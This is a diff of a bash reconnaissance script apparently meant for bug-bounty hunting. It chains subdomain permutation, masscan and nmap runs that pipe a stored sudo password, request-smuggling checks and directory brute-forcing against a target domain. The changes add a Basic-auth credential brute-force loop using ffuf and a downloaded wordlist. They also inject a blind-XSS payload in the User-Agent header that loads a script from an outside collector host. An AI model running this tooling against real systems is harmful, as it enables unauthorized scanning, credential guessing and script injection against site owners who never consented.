@@ -146,7 +146,8 @@ sleep 5
 echo "[+] DNSGEN & TOK SUBDOMAIN PERMUTATION [+]"
 if [ ! -f ~/recon/$1/$1-dnsgen.txt ] && [ ! -z $(which dnsgen) ] && [ ! -z $(which tok) ]; then
 	cat ~/recon/$1/$1-final.txt | sed 's/\.$//g' | tok | sort -u > ~/recon/$1/$1-final.tmp
-	cat ~/recon/$1/$1-final.txt | sed 's/\.$//g' | dnsgen -w ~/recon/$1/$1-final.tmp - | massdns -r ~/tools/massdns/lists/resolvers.txt -o J --flush 2>/dev/null | jq -r .query_name | sort -u | tee -a ~/recon/$1/$1-dnsgen.tmp
+	[ ! -f ~/tools/nameservers.txt ] && wget https://public-dns.info/nameservers.txt -O ~/tools/nameservers.txt
+	dnsgen ~/recon/$1/$1-final.txt -w ~/recon/$1/$1-final.tmp | massdns -r ~/tools/nameservers.txt -o J --flush 2>/dev/null | jq -r .query_name | sort -u | tee -a ~/recon/$1/$1-dnsgen.tmp
 	cat ~/recon/$1/$1-dnsgen.tmp | sed 's/-\.//g' | sed 's/-\.//g' | sed 's/-\-\-\-//g' | sort -u > ~/recon/$1/$1-dnsgen.txt
 	dnsgens=`scanned ~/recon/$1/$1-dnsgen.txt`
 	message "DNSGEN%20generates%20$dnsgens%20subdomain(s)%20for%20$1"
@@ -225,6 +226,7 @@ else
 fi
 sleep 5
 
+big_ports=`cat ~/recon/$1/$1-masscan.txt | grep 'Host:' | awk {'print $5'} | awk -F '/' {'print $1'} | sort -u | paste -s -d ','`
 cat ~/recon/$1/$1-masscan.txt | grep "Host:" | awk {'print $2":"$5'} | awk -F '/' {'print $1'} | sed 's/:80$//g' | sed 's/:443$//g' | sort -u > ~/recon/$1/$1-open-ports.txt  
 cat ~/recon/$1/$1-open-ports.txt ~/recon/$1/$1-final.txt > ~/recon/$1/$1-all.txt
 
@@ -253,8 +255,8 @@ else
 fi
 sleep 5
 
-diff --new-line-format="" --unchanged-line-format="" <(cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort) <(sort ~/recon/$1/$1-alive.txt) > ~/recon/$1/$1-diff.txt
-diff --new-line-format="" --unchanged-line-format="" <(sort ~/recon/$1/$1-alive.txt) <(cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort) >> ~/recon/$1/$1-diff.txt
+diff --new-line-format="" --unchanged-line-format="" <(cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort) <(sort ~/recon/$1/$1-alive.txt) > ~/recon/$1/$1-diff.txt
+diff --new-line-format="" --unchanged-line-format="" <(sort ~/recon/$1/$1-alive.txt) <(cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort) >> ~/recon/$1/$1-diff.txt
 
 echo "[+] TKO-SUBS for Subdomain TKO [+]"
 if [ ! -f ~/recon/$1/$1-tkosubs.txt ] && [ ! -z $(which tko-subs) ]; then
@@ -285,7 +287,7 @@ sleep 5
 
 echo "[+] COLLECTING ENDPOINTS [+]"
 for urlz in `cat ~/recon/$1/$1-httprobe.txt`; do 
-	filename=`echo $urlz | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'`
+	filename=`echo $urlz | sed 's/http\(.?*\)*:\/\///g'`
 	link=$(python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli | grep -E "*.js$" | grep "$1" | grep "Running against:" |awk {'print $3'})
 	if [ ! -z $link ]; then
 		for linx in $link; do
@@ -301,7 +303,7 @@ sleep 5
 
 echo "[+] COLLECTING ENDPOINTS FROM GITHUB [+]"
 if [ ! -z $(cat ~/tools/.tokens) ] && [ -e ~/tools/.tokens ]; then
-	for url in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort -u`; do 
+	for url in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u`; do 
 		python3 ~/tools/github-endpoints.py -d $url -s -r -t $(cat ~/tools/.tokens) > ~/recon/$1/github-endpoints/$url.txt
 		sleep 5
 	done
@@ -315,7 +317,7 @@ sleep 5
 
 echo "[+] HTTP SMUGGLING SCANNING [+]"
 if [ -e ~/tools/smuggler.py ]; then
-	for url in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort -u`; do
+	for url in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u`; do
 		python3 ~/tools/smuggler.py -u $url -v 1 >> ~/recon/$1/http-desync/$url.txt
 	done
 	message "Done%20scanning%20of%20request%20smuggling%20in%20$1"
@@ -327,7 +329,7 @@ fi
 sleep 5
 
 echo "[+] MASSDNS SCANNING [+]"
-massdns -r ~/tools/massdns/lists/resolvers.txt ~/recon/$1/$1-alive.txt -o S > ~/recon/$1/$1-massdns.txt
+massdns -r ~/tools/nameservers.txt ~/recon/$1/$1-alive.txt -o S > ~/recon/$1/$1-massdns.txt
 message "Done%20Massdns%20Scanning%20for%20$1"
 echo "[+] Done massdns for scanning assets"
 sleep 5
@@ -345,7 +347,7 @@ sleep 5
 
 echo "[+] AQUATONE SCREENSHOT [+]"
 if [ ! -z $(which aquatone) ]; then
-	cat ~/recon/$1/$1-httprobe.txt | aquatone -out ~/recon/$1/aquatone
+	cat ~/recon/$1/$1-httprobe.txt | aquatone -ports $big_ports -out ~/recon/$1/aquatone
 	message "Done%20Aquatone%20for%20Screenshot%20for%20$1"
 	echo "[+] Done aquatone for screenshot of Alive assets"
 else
@@ -355,7 +357,6 @@ fi
 sleep 5
 
 echo "[+] NMAP PORT SCANNING [+]"
-big_ports=`cat ~/recon/$1/$1-masscan.txt | grep 'Host:' | awk {'print $5'} | awk -F '/' {'print $1'} | sort -u | paste -s -d ','`
 if [ ! -f ~/recon/$1/$1-nmap.txt ] && [ ! -z $(which nmap) ]; then
 	[ ! -f ~/tools/nmap-bootstrap.xsl ] && wget "https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl" -O ~/tools/nmap-bootstrap.xsl
 	echo $passwordx | sudo -S nmap -sSVC -A -O -Pn -p$big_ports -iL ~/recon/$1/$1-ip.txt --script http-enum,http-title --data-length=50 --stylesheet ~/tools/nmap-bootstrap.xsl -oA ~/recon/$1/$1-nmap
@@ -373,7 +374,7 @@ echo "[+] WEBANALYZE SCANNING FOR FINGERPRINTING [+]"
 if [ ! -z $(which webanalyze) ]; then
 	[ ! -f ~/tools/apps.json ] && wget "https://raw.githubusercontent.com/AliasIO/Wappalyzer/master/src/apps.json" -O ~/tools/apps.json
 	for target in `cat ~/recon/$1/$1-httprobe.txt`; do
-		filename=`echo $target | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'`
+		filename=`echo $target | sed 's/http\(.?*\)*:\/\///g'`
 		webanalyze -host $target -apps ~/tools/apps.json -output json | jq > ~/recon/$1/webanalyze/$filename.txt
 	done
 	message "Done%20webanalyze%20for%20fingerprinting%20$1"
@@ -385,7 +386,7 @@ fi
 sleep 5
 
 echo "[+] OTXURL Scanning for Archived Endpoints [+]"
-for u in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort -u`;do echo $u | otxurls | grep "$u" >> ~/recon/$1/otxurls/tmp-$u.txt; done
+for u in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u`;do echo $u | otxurls | grep "$u" >> ~/recon/$1/otxurls/tmp-$u.txt; done
 cat ~/recon/$1/otxurls/* | sort -u | get-title >> ~/recon/$1/otxurls/$1-otxurl.txt 
 rm ~/recon/$1/otxurls/tmp-*
 message "OTXURL%20Done%20for%20$1"
@@ -393,7 +394,7 @@ echo "[+] Done otxurls for discovering useful endpoints"
 sleep 5
 
 echo "[+] WAYBACKURLS Scanning for Archived Endpoints [+]"
-for u in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort -u`;do echo $u | waybackurls | grep "$u" >> ~/recon/$1/waybackurls/tmp-$u.txt; done
+for u in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u`;do echo $u | waybackurls | grep "$u" >> ~/recon/$1/waybackurls/tmp-$u.txt; done
 cat ~/recon/$1/waybackurls/* | sort -u | get-title >> ~/recon/$1/waybackurls/$1-waybackurls.txt 
 rm ~/recon/$1/waybackurls/tmp-*
 message "WAYBACKURLS%20Done%20for%20$1"
@@ -416,8 +417,21 @@ fi
 rm ~/recon/$1/$1-temp-vhost-wordlist.txt
 sleep 5
 
+echo "[+] 401 Scanning"
+[ ! -f ~/tools/basic_auth.txt ] && wget https://raw.githubusercontent.com/phspade/Combined-Wordlists/master/basic_auth.txt -O ~/tools/basic_auth.txt
+for i in `cat ~/recon/$1/$1-httprobe.txt`; do
+	stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
+	if [ 401 == $stat_code ]; then
+		ffuf -c -w ~/tools/basic_auth.txt -u $i -k -r -H "Authorization: Basic FUZZ" -mc all -fc 500-599,401 -of html -o ~/recon/$1/$1-basic-auth.html 
+	else
+		echo "$stat_code >> $i"
+	fi
+done
+echo "[+] Done 401 Scanning for $1"
+sleep 5
+
 echo "[+] DirSearch Scanning for Sensitive Files [+]"
-cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort -u | xargs -P10 -I % sh -c "python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,404,301,401,500,406,503,502 -t 100 -H \"User-Agent: '\">blahblah<script src='$xss_hunter'></script>testing\" -b --plain-text-report ~/recon/$1/dirsearch/%-dirsearch.txt"
+cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u | xargs -P10 -I % sh -c "python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,404,301,401,500,406,503,502 -t 100 -H \"User-Agent: %22&quot;'>blahblah<script src='$xss_hunter'></script>testing\" -b --plain-text-report ~/recon/$1/dirsearch/%-dirsearch.txt"
 echo "[+] Done dirsearch for file and directory scanning"
 sleep 5
 
